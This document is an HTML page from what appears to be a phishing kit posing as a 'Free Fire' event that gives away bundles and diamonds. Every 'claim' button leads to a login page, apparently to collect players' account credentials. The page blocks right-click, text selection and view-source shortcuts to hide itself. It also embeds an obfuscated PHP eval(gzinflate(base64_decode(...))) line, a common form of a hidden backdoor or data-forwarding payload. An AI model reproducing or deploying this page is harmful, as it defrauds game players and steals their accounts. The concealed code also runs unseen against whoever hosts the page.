<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
<div align="center"><noscript>
   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
</noscript></div>

<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>
<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>
<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<head>

<title>FREE FIRE - EVENT BUNDLE & DIAMOND</title>
<link rel="stylesheet" type="text/css" href="css/style.css"/>
</head>
<body>
<div id="wrapper">

	<h1>FREE FIRE<small>click claim to get bundle,diamond</small></h1>
	<div id="content">
	<ul id="movieposters">
			    <!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
	   
			<li>
				<img src="uhuinfo/uhu1.png" alt="" />
				<div class="movieinfo">
					<h3>BUNDLE ANGEL AND THE DEVIL</h3>
					<p>Tersedia (13)</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="uhuinfo/uhu2.png" alt="" />
				<div class="movieinfo">
					<h3>BUNDLE PUMPKIN WARIOR</h3>
					<p>Tersedia (21)</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="uhuinfo/uhu3.png" alt="" />
				<div class="movieinfo">
					<h3>BUNDLE CUNNING WITCH</h3>
					<p>MTersedia (10)</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	<ul id="movieposters">
	<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
	
		<li>
				<img src="uhuinfo/8.png" alt="" />
				<div class="movieinfo">
					<h3>5000 DIAMOND</h3>
					<p>Tersedia (3)</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="uhuinfo/9.png" alt="" />
				<div class="movieinfo">
					<h3>2000 DIAMOND</h3>
					<p>Tersedia (20)</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="uhuinfo/10.png" alt="" />
				<div class="movieinfo">
					<h3>1000 DIAMOND</h3>
					<p>Tersedia (33)</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
</body>
</html>